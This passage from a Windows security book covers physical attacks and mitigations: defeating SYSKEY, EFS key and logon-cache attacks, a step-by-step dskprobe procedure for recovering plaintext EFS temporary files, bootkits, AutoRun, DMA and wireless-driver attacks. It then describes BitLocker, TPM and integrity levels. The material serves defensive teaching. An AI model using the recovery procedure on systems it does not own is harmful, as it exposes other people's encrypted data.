 an  attack  of  this  nature  partially  is  to  configure  Windows  2000  and  later  to  boot  in  SYSKEY  password-  or  floppy-required  mode.  See Chapter 2 for a discussion on the three modes of SYSKEY.   It is interesting to note that Microsoft asserts in its response to the Grace and Bartlett  paper that the ability to delete the SAM, causing the Administrator password to be reset  to NULL, can be solved by SYSKEY. Don’t be misled—we have already demonstrated  that this is false unless the SYSKEY password- or floppy-required mode is set  the paper  does not refer to this .  While SYSKEY mode 2 or 3 will prevent simple attacks such as deleting the SAM to  nullify the Administrator password, it will not dissuade an attacker who uses chntpw to  disable SYSKEY, no matter what mode it is in  although this risks crippling the target  system if it is Windows 2000 and later . However, in a paper entitled “Analysis of Alleged  Vulnerability in Windows 2000 Syskey and the Encrypting File System”  see “References  and Further Reading” , Microsoft notes that even though disabling SYSKEY in mode 2  or 3 can allow an attacker to log in to a system, he will be unable to access EFS-encrypted  files because the SYSKEY is not stored on the system and thus is not available to unlock  the LSA Secrets store where the EFS keys are kept. So, SYSKEY implemented in mode 2  or 3, while not sufficient to deny access to the system, will deny access to EFS-encrypted  files.  We  thus  recommend  setting  SYSKEY  in  mode  2  or  3  for  mobile  users  who  risk  having their laptops stolen. Export Recovery Keys and Store Them Securely  Another OS-level mechanism for mitigating  the risk of a recovery agent key attack is to export the recovery agent key and delete it  from the local system.  Unfortunately, Microsoft poorly documents this procedure, so we reiterate it here in  detail. To export the recovery agent s  certificates on stand-alone systems, open the local  Group  Policy  object   gpedit.msc ,  browse  to  the  Computer  Configuration\Windows  Settings\Security Settings\Public Key Policies\Encrypted Data Recovery Agents node,  right-click the recovery agent listed in the right pane  usually, this is Administrator , and  choose All Tasks  Export.  A wizard will run, prompting you to enter various pieces of information before the  key can be exported. To back up the recovery agent key, you must export the private key  along  with  the  certificate;  we  recommend  enabling  strong  protection   this  requires  a  password . Finally, make sure to select Delete The Private Key If Export Is Successful.  This last step is what makes stealing the recovery agent decryption key from the local  system highly improbable  we just hate to say impossible .  Recall that deleting the recovery agent certificate before exporting it will disable EFS since Windows  2000 mandates a recovery agent. EFS doesn’t work unless a recovery agent is defined!  Items that have been encrypted prior to the deletion of the recovery agent remain  encrypted, but, of course, they can be opened only by the encrypting user unless the  recovery agent can be restored from backup. Implement  EFS  in  the  Context  of  a Windows  Domain  For  machines  joining  a  domain,  the  situation is different: the domain controller holds the recovery key for all systems in the    Chapter 11:  Physical Attacks   353  domain. When a Windows 2000 or later machine joins a domain, the Domain Default  Recovery Policy automatically takes effect; the Domain Administrator, rather than the  local Administrator, becomes the recovery agent. This physically separates the recovery  keys from the encrypted data and makes attacking the recovery agent key much more  difficult.  It is good practice to export the recovery agent certificate from domain controllers as  well. If the domain controllers were compromised, every system in the domain would  become vulnerable if the recovery key were available locally.  It is critical to remind everyone that even though the recovery agent key may be  protected by exporting and deleting it from the local machine, or by joining a domain,  none of these countermeasures will protect EFS-encrypted data from an attacker that  compromises the user account that encrypted the data. Remember that the FEK encrypted  with the user’s public key is stored in the DDF associated with every EFS-encrypted  file. The act of logging in as that user will allow transparent decryption of every file she  previously encrypted. Thus, SYSKEY mode 2 or 3 is the only real valid protection for  EFS data.  If you use SYSKEY mode 3, don’t store the floppy in proximity to the protected system; otherwise, you  will have mostly defeated the protection.  To drive this point home, let’s consider the NT family logon cache. That’s right, as we  mentioned in Chapter 2, all NT family systems cache domain credentials on the local machine to allow authentication, even if the domain controller is not reachable. Did you  ever wonder how you could log on to the domain from your laptop when you weren’t  even plugged into the network? This is because by default the last 10 sets of domain  authentication credentials are stored on the machine—in essence, you are authenticating  with your own cached username password!  This  feature  is  described  in  Microsoft  Knowledge  Base  article  172931,  which  also  describes the Registry key to configure this setting. With Windows 2000, this setting is  exposed via the Security Policy option Interactive Logon: Number Of Previous Logons  To  Cache   In  Case  Domain  Controller  Is  Not  Available .  This  setting  is  particularly  relevant to EFS, because if an attacker with physical access to a machine could obtain the  logon cache, he could authenticate as a user and view the user’s EFS-encrypted files.  Todd Sabin of Bindview’s Razor security research team presented just this attack at the  Black Hat Conference in 2001, and he also posted a brief description of his approach to  the  Bugtraq  mailing  list  in  early  2003.  Todd  demonstrated  the  use  of  a  tool  he  called  hashpipe  to  dump  the  logon  cache  of  an  NT  family  system,  revealing  the  hashed  passwords of cached logons.  Note that hashpipe has not been published.  Although the  passwords would still have to be cracked  see Chapter 7 , this approach does expose a  potential loophole in the security of EFS used in the context of a domain. Solution? Set  the domain logon cache to zero, as shown in Figure 11-1.  Setting the domain logon cache to zero will prevent domain users from logging on to a system unless  a domain controller is reachable.   354   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 11-1  The previous logon cache setting in Windows XP’s Local Security Policy  Using alternative authentication mechanisms  for example, requiring a smart card for logon  is another  good way to avoid attacks against the logon cache.  Bitlocker  Drive  Encryption   BDE   With  Windows  Vista,  Microsoft  introduced  Bitlocker  Drive Encryption  BDE . We discuss BDE in more detail in Chapter 12. Although BDE  was primarily designed to provide greater assurance of operating system integrity, one  ancillary  result  from  its  protective  mechanisms  is  to  blunt  the  offline  attacks  we’ve  described in this chapter. Rather than associating data encryption keys with individual  user accounts as EFS does, BDE encrypts entire volumes and stores the key in ways that  are much more difficult to compromise  at least at the time of this publication, no effective  mechanisms have been published . With BDE, an attacker who gets unrestricted physical  access to the system  say, by stealing a laptop  cannot decrypt data stored on the encrypted  volume because Windows won’t load if it has been tampered with, and booting to an  alternate OS will not provide access to the decryption key since it is stored securely.  See  Chapter  12  for  more  information  on  the  various  options  BDE  can  use  to  protect  the  volume encryption key.   ONLINE ATTACKS  Now  that  we’ve  covered  offline  physical  attacks  that  typically  require  booting  to  an  alternative OS, let’s shift gears and discuss physical attacks that are implemented while  the system is online.   Chapter 11:  Physical Attacks   355  EFS Temporary File Data Retrieval  Popularity: Simplicity: Impact: Risk Rating:  8 10 10 9  This attack differs from others discussed previously in that it does not require booting  to an alternative OS. It can be mounted via the standard Windows user interface, given  appropriate privileged access to a system and given that the data in question has not been  overwritten by normal file operations. It can even be implemented remotely assuming  interactive remote control is possible. Of course, given Administrator access to Windows,  the attacker could simply use techniques described previously to access the EFS-protected  files. However, the attack described here provides a less invasive mechanism for accessing  the data than booting to an alternative OS and is thus worthy of exploring.  On January 19, 2001, Rickard Berglind posted an interesting observation to the popular  Bugtraq security mailing list. It turns out that when a file is selected for encryption via EFS,  the file is actually not encrypted directly. Rather, a backup copy of the file is moved into a  temporary directory and renamed efs0.tmp. Then, the data from this file is encrypted and  used to replace the original file. The backup file is deleted after encryption is complete.  However, after the original file is replaced with the encrypted copy and the temporary  file is deleted, the physical blocks in the file system where the temporary file resided are  never cleared. These blocks contain the original, unencrypted data. In other words, the  temporary file is deleted in the same way any other file is “deleted”—an entry in the  master file table is marked as empty and the clusters where the file was stored are marked  as available, but the physical file and the information it contains will remain in plaintext  on the physical surface of the disk. When new files are added to the partition, they will  gradually overwrite this information, but if the encrypted file was large, it could be left  for months, depending on disk usage.  In a response to Rickard’s posting, Microsoft confirmed that this behavior is by design  for  individual  files  that  are  encrypted  using  EFS  and  pointed  to  its  paper  entitled  “Encrypting File System for Windows 2000”  see “References and Further Reading” at  end of this chapter , which explains this clearly. It also made some suggestions for best  practices to avoid this problem, which we discuss a bit later.  How could this behavior be exploited to read EFS-encrypted data? This data is easily  read using a low-level disk editor such as dskprobe.exe from the Support Tools on the  Windows 2000 installation CD-ROM, making it possible for any user with console access  to the local host to read the data of the encrypted file. We discuss how to use dskprobe to  read efs0.tmp next.  First, launch dskprobe and open the appropriate physical drive for read access by  selecting Drives  Physical Drive and double-clicking the appropriate physical drive in  the upper-left window. Then, click the Set Active button adjacent to this drive after it  populates the Handle 0 portion of this dialog. Once this is complete, you should see a  window similar to Figure 11-2.   356   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 11-2  Opening PhysicalDrive0 for “read” access in dskprobe. Note that Handle0 is open and  set as active.  Once  this  is  accomplished,  the  appropriate  sector  containing  the  data  you  wish  to  identify must be located. Locating files on a raw physical disk can be like finding a needle  in a haystack, but you can use dskprobe’s Tools  Search Sectors command to assist in this  search. In the example shown in Figure 11-3, we search for the string efs0.tmp in sectors 0  to the end of the disk. Note that we have also selected Exhaustive Search, Ignore Case,  and Unicode Characters  using ASCII does not seem to work for some reason .  Once the search is complete, if EFS has been used to encrypt a file on the disk being  analyzed and if the efs0.tmp file has not been overwritten by some other disk operation,  it will appear in the dskprobe interface with contents revealed in cleartext. A search for  the string efs0.tmp may also reveal other sectors on disk that contain the string.  A file  called efs0.log also contains a reference to the full path to efs0.tmp.  One way to ensure  that you’ve got the efs0.tmp file rather than a file containing that string is to look for the  FILE* string in the top of the dskprobe interface. This indicates the sector contains a file.  Both efs0.log and efs0.tmp appear to be created in the same directory as the file that was  encrypted, but they are not visible via standard interfaces, only through such tools as  dskprobe. Figure 11-4 shows a sample efs0.tmp file that has been discovered in sector  21249 open in dskprobe, revealing the cleartext content of the file  again, note the FILE*  string at the top, indicating that this is a file .  An attacker may launch dskprobe from over the network via remote shell or Terminal Server session,  not only from the physical console!  While low-level disk editor attacks are not as straightforward as simply deleting the  SAM or injecting hashes into it, it is another important consideration for those implementing  EFS in environments where encrypted data may be exposed to such attacks.   Chapter 11:  Physical Attacks   357  Figure 11-3  Dskprobe searches the physical disk for the string efs0.tmp.  Figure 11-4  efs0.tmp open in dskprobe, revealing the cleartext content of the ﬁ le   358   Hacking Exposed Windows: Windows Security Secrets & Solutions   Blocking EFS Temporary File Retrieval In Microsoft’s response to the Bugtraq noted previously, the company stated the plaintext  backup file is created only if an existing single file is encrypted. If a file is created within an  encrypted folder, it will be encrypted right from the start, and no plaintext backup file  will be created. Microsoft recommends this as the preferred procedure for using EFS to  protect  sensitive  information,  as  described  in  “Encrypting  File  System  for  Windows  2000,” page 22:  It is recommended that it is always better to start by creating an empty encrypted folder  and creating ﬁ les directly in that folder. Doing so ensures that plaintext bits of that ﬁ le  never get saved anywhere on the disk. It also has a better performance as EFS does not  need to create a backup and then delete the backup.  Take-home point: Rather than encrypting individual files, encrypt a folder to contain all  EFS-protected data, and then create sensitive files only from within that directory.  Microsoft also released an updated version of the command-line EFS tool cipher.exe  to correct this issue. The updated version can be used to wipe deleted data from the disk  so that it cannot be recovered via any mechanism. The updated cipher.exe can be obtained  from the URL listed in “References and Further Reading” at the end of this chapter, and  it requires Service Pack 1.  Make sure to install the updated cipher.exe tool using the installer program. Misuse of this tool could  result in data loss.  The updated cipher.exe tool wipes deallocated clusters from disk. Deallocated clusters  are portions of an NTFS file system that were once used to store data but are no longer in  use, because the file that used the clusters shrank or it was deleted. NTFS thus marks  these clusters as being available for allocation to a different file if needed.  To overwrite the deallocated data using the new cipher.exe, do the following:          1.  Close all applications. 2.  Open a command prompt by selecting Start  Run and entering CMD at the   command line.  3.  Type Cipher  W:  where   is any directory on the   drive you want to clean. For instance, typing Cipher  W:c:\test will cause the  deallocated space within C:\test to be overwritten.  The tool will begin running and will display a message when it’s completed. If you  want to wipe deallocated space off an entire drive, mount the NTFS drive as a directory   for  instance,  a  drive  could  be  mounted  as  C:\folder1\D_Drive .  This  usage  enables  entire NTFS drives to be cleaned.  For you paranoids in the audience, cipher actually performs three wipes: the first pass writes 0, the  second pass writes 0xF, and the third pass writes pseudorandom data.   Chapter 11:  Physical Attacks   359  Device Media Wireless Attacks  As we mentioned in Chapter 2, attacks against kernel-resident device drivers that parse  raw input, such as from network connections or inserted media, have become increasingly  discussed  in  research  circles.  These  attacks  shared  a  common  thread,  which  is  the  propensity of Windows to permit physical wireless hardware connections execute code  at a very high degree of privilege. We’ll discuss some examples in this section.  Direct Memory Access  DMA   Popularity: Simplicity: Impact: Risk Rating:  One of the more commonly exploited security weaknesses of the PC architecture is  Direct Memory Access  DMA . Readers interested in more detail on DMA should see  “References  and  Further  Reading,”  but  for  purposes  of  this  chapter,  DMA  is  best  understood  as  a  mechanism  designed  to  bypass  the  operating  system   and  all  of  its  security  controls   to  read  and  write  main  memory.  Sound  like  a  major  security  vulnerability? Well, let’s call it a “feature.”  Using this “feature,” Michael Becher, Maximillian Dornseif, and Christian N. Klein  demonstrated  an  exploit  at  the  CanSec  West  2005  conference  that  used  DMA  to  read  arbitrary memory locations of a FireWire-enabled system. They demonstrated an attack  based on an iPod running Linux that was plugged into a victim computer to perform  arbitrary commands, completely outside of operating system control or detection. David  Maynor presaged this and many future device driver-based attacks  including some of  the wireless attacks we’ll discuss later  and even demonstrated a DMA attack via USB  device at Toorcon 2005. David Hulton discussed attacks using DMA via CardBus  the  PCMCIA  standard   at  ShmooCon  in  2006.  Clearly,  malicious  devices  have  a  robust  future.  Bootkits Popularity: Simplicity: Impact: Risk Rating:  Another popular physical attack mechanism is to load malicious code from the boot  sector  of  bootable  media   which  can  include  hard  disks,  CDs,  USB  drives,  and  even  network  boot  points . An  implementation  of  such  an  attack  was  presented  by  Derek  Soeder and Ryan Permeh of eEye Digital Security  www.eeye.com  at the Black Hat USA   4 3 9 5  5 5 9 6   360   Hacking Exposed Windows: Windows Security Secrets & Solutions   2005. The presented implementation was called eEye BootRootKit to play on the notion  of a rootkit inserted via bootable media. Here’s eEye’s description of BootRootKit: eEye BootRootKit is… a removable-media boot sector that situates itself to regain  execution later, as Windows is loading, and then seamlessly continues the boot sequence  from hard drive 0. The basic concept employed is to hook INT 13h and “virtually patch”  the Windows OS loader as it’s read from disk, then leverage this patch to hook into  NDIS.SYS after it has been loaded into memory and validated. The hook function’s  purpose is simple: scan all incoming Ethernet frames for a signature in a speciﬁ c  location, and execute code  with kernel privileges  from any matching frame. More recently, the term bootkit has been popularized to describe a rootkit that is able  to load from a master boot record and persist in memory all the way through the transition  to protected mode and the startup of the OS. Taking up where eEye left off, Nitin Kumar  and Vipin Kumar published their work on VBootkit  for Vista bootkit , which doesn’t  make any modifications to on-disk files, working solely in memory to maintain stealth.  Kumar and Kumar claim to have successfully bypassed Vista’s Bitlocker Drive Encryption   BDE  with this technique, although results were not available as of this writing. Public  conjecture  by  Microsoft   see  Chapter  8   indicates  that  BDE  should  block  this  attack.  Kumar  and  Kumar  are  also  working  on  a  TPMKit  that  claims  to  bypass  all  of  the  protections enforced by BDE even if enhanced with a Trusted Platform Module  TPM , a  hardware module that is designed to independently attest to the integrity of key elements  of boot process code. The attack payload commonly demonstrated elevates command  prompts to SYSTEM privileges at timed intervals.  One possible scenario for a bootkit-based attack is to use the ISO CD-ROM image   such as the one included in eEye’s proof-of-concept package , walk up to a machine,  insert the bootkit CD-ROM, push the power button to reset the system, and then walk  away. Assuming the system BIOS is configured to boot from the CD-ROM, the machine  is then bootkitted once Windows comes back up. This dramatically lowers the amount of  interaction an attacker would need to compromise a system successfully if physically  standing in front of it, making an attack more difficult to detect visually.  See Chapter 8 for more details on general rootkit attacks and countermeasures.  AutoRun Popularity: Simplicity: Impact: Risk Rating:  9 6 6 7  Somewhat less sophisticated than bootkits are so-called AutoRun attacks, based on  the Windows feature of the same name that automatically runs a program specified by  the file autorun.inf whenever a CD-ROM, DVD, or USB drive is inserted. AutoRun can  specify any arbitrary program, so this has obvious implications for security. Again, we    Chapter 11:  Physical Attacks   361  can contemplate scenarios in which unwitting users insert innocuous-looking CD-ROMs,  DVDs, or USB sticks, only to be silently rootkitted as the splash screen displays. One of  the most highly visible distributions of cloaked software, the Sony rootkit debacle, was  actually achieved using AutoRun functionality  see “References and Further Reading” .  Fortunately, the AutoRun feature is easily disabled, either by holding down the SHIFT key  when  the  media  is  inserted  or  by  changing  the  Registry  value  HKLM\System\ CurrentControlSet\Services\CDRom\Autorun to 0 and rebooting the system.  Wireless Network Connection Attacks  Popularity: Simplicity: Impact: Risk Rating:  5 5 10 7  Using wireless networking technology, attackers may not even have to touch a system  physically  in  order  to  compromise  it   although  obviously  some  physical  proximity  is  required, which is why we discuss it in this chapter . At the Defcon 14 security conference  in 2006, Johnny Cache unveiled attacks against 802.11 wireless networking drivers that  allowed him to compromise systems at the kernel level during the act of discovering  local wireless access points.  In  a  subsequent  paper  on  this  technique   see  “References  and  Further  Reading” ,  Cache, H. D. Moore, and skape illustrated real-world attacks using these techniques. The  essence of the technique is to send the victim raw 802.11 frames that are processed while  the target is not authenticated or associated with a wireless access point. More specifically,  the authors created rogue Beacon request and Probe response frames normally used to  discover  and  advertise  nearby  wireless  networks.  Using  fuzzing,  the  Metasploit  framework, and leveraging previously published Windows kernel exploit development  techniques, the authors discovered vulnerabilities in commercial 802.11 wireless adapter  drivers from BroadCom  oversized SSID in beacon and directed probe responses caused  stack  overflows ,  D-Link   oversized  Supported Rates  information  element  triggered  stack  overflow  when  beaconed  to  vulnerable  clients  within  range ,  and  NetGear   oversized SSID, Supported  Rates,  and Channel  information  elements  triggered  stack overflow  that all resulted in kernel-level compromise of the target system, simply  after receiving specially crafted 802.11 frames.  One scenario for implementing such an attack is via so-called evil twins—rogue access  points set up to look like legitimate hotspots  for example, T-Mobile hotspots at coffee  shops . Figure 11-5 shows Windows Wireless Network Connection browser surveying  potentially malicious access points. This concept was discussed as far back as 2002 by  Internet Security Systems in a paper about wireless base station cloning, and it has gotten  more  attention  as  wireless  technology  has  proliferated.  A  related  attack  known  as  promiscuous  client  involves  a  rogue  access  point  or  ad  hoc  station  that  provides  an  irresistibly strong signal and becomes the preferred network connection. The next time  you’re sipping coffee at your local café and decide to open your laptop to view available  wireless hotspots, think twice!   362   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 11-5  Wireless connectivity or compromise in waiting?  Although we haven’t seen research, we imagine that similar attacks against Bluetooth  are feasible as well. Robust communities are already dedicated to sending unsolicited  messages via Bluetooth to nearby unsuspecting recipients  so-called “Bluejacking”  as  well as the more dangerous “Bluesnarfing,” which attempts unauthorized access to the  victim device. We recommend turning of the “discoverable” setting on your Bluetooth- capable devices to mitigate these types of attacks.  Keyboard Loggers  Popularity: Simplicity: Impact: Risk Rating:  7 4 9 7  Last, but not least, we discuss hardware keyboard loggers to close out this section on  physical attacks. Such devices can be spliced between the keyboard and computer and  can record every keystroke without the operating system noticing. Although probably  the least sexy of the attacks we’ve discussed so far, we nevertheless bring them up as    Chapter 11:  Physical Attacks   363  they are obviously highly effective in compromising sensitive information in a manner  that is often difficult to detect without regular physical inspection. And with modern  USB keyboard cables that don’t require OS interaction to unplug replug the keyboard,  this sort of attack is easy to carry out and difficult to detect.  Countermeasures to Device Media Network Connection Attacks Since the attacks we’ve described primarily result from flaws in software device drivers  produced by the device manufacturers, the average user can do little to defend against  them beyond keeping the device software updated. Your only alternative is to be very  circumspect with connections from devices, media, or networks. It’s generally easy to  refuse manually inserted devices or media from untrustworthy sources, but with mostly  invisible wireless connections the challenge is greater. We recommend using hardware  that provides a wireless radio on off switch, and switching it to “Off” where feasible   such  as  when  traveling  through  “hostile”  environments  such  as  heavily  populated  metropolitan areas or airports where wireless access points are plentiful and few would  notice a rogue AP . Remember that it takes only one beacon packet from an evil wireless  access point to compromise your machine!  Don’t be confused: wireless encryption standards, Secure Sockets Layer  SSL , and or virtual private  network networking   VPN   mechanisms  don’t  protect  you  against  these  types  of  attacks.  The  compromise occurs at the link layer, before any of the standard communications encryption techniques  become relevant.  SUMMARY  By now, you should understand that any intruder who gains unrestricted physical access  to a Windows system is capable of accessing just about any data he could desire on that  system. As Microsoft Trustworthy Computing Team member Scott Culp writes in his  “Ten Immutable Laws of Security”  see “References and Further Reading” for the link :  “Law 3: If a bad guy has unrestricted physical access to your computer, it’s not your  computer anymore.”  Because of the tremendous advantage enjoyed by an attacker with physical access,  the best countermeasures should always include the classic mechanisms: keep systems  physically secure  using locks, monitoring, and or alarms as appropriate for the room,  computer  case,  and or  mobile  device ,  remove  or  disable  bootable  removable  media  drives,  and  set  a  BIOS  password  that  must  be  entered  before  the  system  can  be  bootstrapped.  Optimally,  set  a  password  for  hard  drive  access  using ATA-3  specs  or  greater.  Effective  monitoring  and  alerting  procedures  are  also  important,  so  even  if  someone does manage to get to a machine, at least their actions are recorded  such as via  video surveillance  and the proper authorities are notified. We recommend using all of  these mechanisms where physical security risks are high.  You  can  do  some  things  to  mitigate  risk  from  physical  attacks  using  Windows  features, including Vista’s Bitlocker Drive Encryption  BDE , implementing EFS in the  context of a domain, and using SYSKEY mode 2 or 3. Pay attention to the domain logon  cache, lest these credentials be used to attack a user’s locally cached credentials.   364   Hacking Exposed Windows: Windows Security Secrets & Solutions   Finally, we briefly examined some new attacks against hardware device drivers, the  most alarming of which were attacks on wireless networking adapters that could result  in system compromise simply by receiving invisible communications over the air from a  rogue wireless access point. There is little that can be done to defend against such attacks  today other than to switch off wireless radios when in untrusted environments.  And for those who think we’re a little too paranoid about the risk of physical attack,  remember  this  chapter  the  next  time  you  haul  your  laptop  with  80  gigabytes  of  data  through a busy airport!

This  concept  is  based  on  the  theory  that  a  100  percent  secure  environment is unachievable. The best you can strive for is to make the attacker’s job  as difficult as possible. To its credit, Microsoft continues to improve the ease of securing the  OS. In fact, many of the most effective and pervasive security features found in Windows  XP SP2, Server 2003 SP1, Vista, and Server 2008 operate behind the scenes. Enhancements  have improved how memory is allocated and freed, compilers are generating applications  that  are  more  resilient  to  implementation  flaws   such  as  buffer  overflows ,  exception  handlers have become more intelligent, and the list goes on. Many of these countermeasures  require no configuration or understanding to reap their benefits.  This chapter is dedicated to a discussion of the following features and tools that have  been  integrated  into  the  operating  system  over  the  course  of  its  evolution  through  Windows XP SP2, Server 2003 SP1, Vista, and Server 2008:     BitLocker    Windows Integrity Control    User Account Control    Vista Service Refactoring Hardening    Windows Resource Protection  WRP     SafeSEH    GS    Stack Changes    Address Space Layout Randomization  This is by no means a comprehensive list of all of the security-related functionality  implemented  in  Windows;  rather,  it  highlights  what  we  believe  are  the  most  useful  “under-the-covers” security features of the OS that address the vulnerabilities discussed  in this book. We’ve decided to focus on these less-visible features since we’ve already  discussed many of the more visible features at length throughout the book, including the  Windows Firewall, Group Policy, IPSec, and the Encrypting File System  EFS . In addition,  while  we  are  not  going  to  cover  each  of  these  features  exhaustively,  we  will  focus  specifically on how they can be used to counter the attacks discussed in this book.  BITLOCKER DRIVE ENCRYPTION  With the introduction of Windows Server and Windows Vista came an additional security  feature, BitLocker Drive Encryption  BDE, or BitLocker , which protects the confidentiality  and integrity of the operating system volume during the boot sequence and while the  operating system is not loaded. Windows Server will also extend this capability to protect  data volumes as well. BDE was designed to mitigate offline attacks, such as removing  the physical drive from a lost or stolen laptop and accessing the data from an attacker- controlled operating system. In the following section we discuss the various configuration  options for BitLocker and their prerequisites.   Chapter 12:  Windows Security Features and Tools   369  BitLocker Conﬁ gurations  As mentioned, BitLocker can be configured in a variety of ways. In this section we discuss  each, along with its strengths, weaknesses, and prerequisites. BitLocker can be configured  to operate in the following modes:     BitLocker with a Trusted Platform Module  TPM     BitLocker with a TPM + Startup PIN    BitLocker with a TPM + USB Token    BitLocker without TPM    BitLocker without TPM + USB    BitLocker without TPM + Startup PIN  Microsoft provides an excellent step-by-step procedure for configuring your system in each of these  scenarios at http:  technet.microsoft.com en-us windowsvista aa905092.aspx.  Depending on the desired configuration for BitLocker, your system must also satisfy  other hardware and software prerequisites. To determine whether your Windows Vista  computer meets these requirements, perform the following steps:           1.  Click Start. 2.  Click Control Panel. 3.  Click Security. 4.  Click BitLocker Drive Encryption.  If your computer configuration meets all prerequisites, you will see the screen shown in  Figure 12-1.  At a high level, these configuration options represent different combinations of the   following:     Systems with the TPM    Systems without the TPM    Systems using single-factor authentication    Systems using two-factor authentication  Of these, the most secure configuration is a system that has a TPM and utilizes two- factor authentication, and here’s why: The TPM provides BitLocker with the ability to  validate each component of the boot process. This ensures the platform is in a known  secure state before decrypting the volume.  We will touch more on this a bit later in the  section “BitLocker with TPM.”   With most authentication systems, and barring implementation flaws, the degree of  difficulty to authenticate as another principal increases with the number of “factors”— each factor introduces an additional test that must be passed by the entity attempting to  authenticate. Common authentication factors include the following:     Something you have   370   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 12-1  System that satisﬁ es BitLocker prerequisites     Something you know    Something you are  Currently, BitLocker supports two of these: something you have  a USB or TPM , and  something you know  a PIN . In the next section, we take a deeper look at the desired  solution—BitLocker  equipped  with  a  TPM  and  an  additional  form  of  authentication,  such as a PIN or USB token.  BitLocker with TPM  The preferred BitLocker configuration leans heavily on a technology designed by the  Trusted Computing Group, called a Trusted Platform Module. A TPM is a microcontroller  that resides on the computer’s motherboard and is utilized primarily for protecting the  confidentiality of encryption keys and validating the integrity of early boot components,  such as the BIOS, Master Boot Record, and boot sector. BitLocker utilizes the TPM for  full-volume  encryption  by  storing  the  root  encryption  key  on  the  TPM  hardware.  By  moving the encryption key from the hard drive to a device that is resilient to software-   Chapter 12:  Windows Security Features and Tools   371  based  attacks,  the  confidentiality  of  this  key,  and  ultimately  the  volume,  is  ensured.  However, there are a couple caveats to this:     The TPM is not designed to resist sophisticated hardware attacks.    Once the operating system is booted, protection is out of the TPM’s hands.  While  protection  may  be  out  of  the  TPM’s  hands,  integrity  checking  can  still  be  accomplished,  especially where BootRoot-style rootkits alter the boot record. The TPM will allow for the detection of  boot sector alterations once the operating system is up and running.  In addition to storing the encryption key, BitLocker utilizes the TPM to collect and  store measurements of components involved with the boot process. These characteristics  act as a digital fingerprint of the system that is acquired when the system is known to be  in a secure state. This fingerprint will remain constant in the absence of any deliberate  modifications. Some legitimate instances, such as upgrading the BIOS, may cause this  fingerprint to change, and BitLocker has procedures for this. However, if an unplanned  modification to any of these characteristics occurs, they are considered unauthorized.  During subsequent boot processes, these characteristics are reacquired and compared to  the original set. If the fingerprints do not match, the system is considered untrustworthy  and the boot process is halted. If the fingerprints do match, the TPM decrypts the keys  used to encrypt the volume, and execution is passed to the operating system.  Because BitLocker relies on the TPM, we will spend some time discussing its finer  points,  including  the  mechanisms  that  support  the  boot  validation  process  and  the  actions taken during the boot validation process.  The Role of the Trusted Platform Module Before we jump into the details of the boot validation process, we will briefly discuss the  TPM capabilities that support it. The TPM provides BitLocker with the ability to encrypt  cryptographic keys in such a manner that they can be decrypted only by the TPM chip  that encrypted them. However, this must occur during recovery scenarios in which a  recovery  key  or  recovery  password  will  allow  decryption.  To  achieve  this,  each  TPM  contains an asymmetric key called the Storage Root Key  SRK , which is used to protect  the confidentiality of other keys. This process is commonly referred to as key “wrapping.”  Like other asymmetric key deployments, the private portion of the SRK is never shared.  Additionally,  the  private  portion  of  the  SRK  is  not  at  risk  to  software-based  attacks  because the TPM maintains separation between it and memory accessible by the operating  system.  This wrapping process can be taken a step further, and this is one of the cornerstones  of BitLocker. The TPM can wrap a key in such a manner that it cannot be unwrapped  unless current platform characteristics are equivalent to those during the time the key  was created. This capability, called “sealing,” is utilized by BitLocker to create a Volume  Master Key  VMK , which protects the Full Volume Encryption Key  FVEK , which is  ultimately used to encrypt the operating system and data volumes. By utilizing a sealed  key,  sensitive  data  cannot  be  decrypted  outside  the  context  of  a  Trusted  Computing  Platform.   372   Hacking Exposed Windows: Windows Security Secrets & Solutions   Determining Trustworthiness During the Boot Sequence Determining  the  trustworthiness  of  a  platform  in  the  absence  of  a  trusted  hardware  component is an extremely difficult task. This is because an attacker can reverse-engineer  and modify the very software components used to protect and validate the platform. The  TPM solves this problem by providing the platform with a trusted entity that can anchor  a chain of trust, which we will dig into now.  Upon initializing BitLocker, when the platform is in a known secure state, the TPM’s  Static  Root  of  Trust  Measurement   SRTM   mechanism  is  utilized  to  measure  various  components of the platform and stores a digest of each measurement in a secure location  within  the  TPM,  called  Platform  Configuration  Registers   PCR .  Upon  boot,  PCRs  0  through 15 are reset and execution is passed to a trusted portion of the TPM firmware  that comprises, in part, the Core Root of Trust Measurement  CRTM . This kickstarts a  series of validations and execution handoffs until the operating system is loaded. During  this process, each boot component is first validated before execution is passed, which  ensures the chain of trust is never broken.  The  default  TPM  platform  validation  mechanism  ensures  the  following  platform  components have not been tampered with. Validation and execution is performed in this  order as well:     Core Root of Trust Measurement  CRTM     BIOS    Platform extensions    Option ROM code    Master Boot Record    Boot sector    Boot block    Boot Manager    OS Loader    Operating system  At  this  point,  the  operating  system  is  responsible  for  validating  and  ensuring  the  integrity of the platform. In upcoming sections, we discuss features of Windows that  pick up where the secure boot process left off.  WINDOWS INTEGRITY CONTROL  One  of  the  most  exciting  new  features  in  Vista  is  the  adoption  of  Mandatory Access  Control Lists  MACLs , which are provided in the form of integrity levels. Vista supports  four  integrity  levels:  Low,  Medium,  High,  and  System.  Integrity  levels  allow  Vista  to  make security decisions based on how trusted an object is. A great example of this is  Internet Explorer, which has a fairly long history of security issues and is, due to its very  nature, commonly exposed to the Internet. As such, it may be wise to consider IE fairly    Chapter 12:  Windows Security Features and Tools   373  suspect. With this in mind, on a default install of Vista, IE is assigned an integrity level  of Low, which prevents IE processes from modifying any object with a higher integrity  level. We can observe this by running Process Explorer, as shown in Figure 12-2.  This  low-integrity  level  implementation  of  IE  7  on Vista  is  also  referred  to  as  Protected  Mode  IE   PMIE .  It’s also important to note that integrity levels, which are stored in the object’s System  Access  Control  List   SACL,  used  for  generating  audit  records ,  trump  grants  within  Discretionary Access Control Lists  DACL , such as file permissions. For example, if an  Administrator is running a low integrity process that attempts to write to fun places like  C:\ or C:\Users, the attempts will fail, regardless of DACLs granting Administrators  Full Control. This is because the default integrity level of all objects on Vista is set to  Medium. However, by default, most SACLs do not prevent lower integrity objects from  reading  or  executing  higher  integrity  objects:  this  is  left  up  to  the  DACL.  Support  is  available  for  such  capabilities,  however.  According  to  MSDN,  an  object’s  SACL  can  contain the following:     SYSTEM_MANDATORY_LABEL_NO_WRITE_UP    SYSTEM_MANDATORY_LABEL_NO_READ_UP    SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP  With these, we can raise the bar a bit more by preventing lower integrity processes from  reading or executing data that exists at a higher 